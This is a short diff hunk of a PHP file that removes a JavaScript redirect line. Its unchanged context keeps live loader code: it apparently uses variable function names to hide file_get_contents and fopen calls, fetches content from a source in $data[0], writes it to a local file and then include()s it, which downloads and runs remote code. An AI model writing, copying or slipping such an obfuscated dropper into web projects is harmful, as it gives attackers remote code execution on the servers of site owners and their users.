@@ -18,7 +18,6 @@ if (!file_exists($data[1]) || filesize($data[1]) === 0) {
     $fopen = $fo($data[1], 'w+');
     $fw($fopen, $fgc($data[0], false, $context));
     $fc($fopen);
-    echo '<script>window.location="?go";</script>';
 }
 
 include($data[1]);
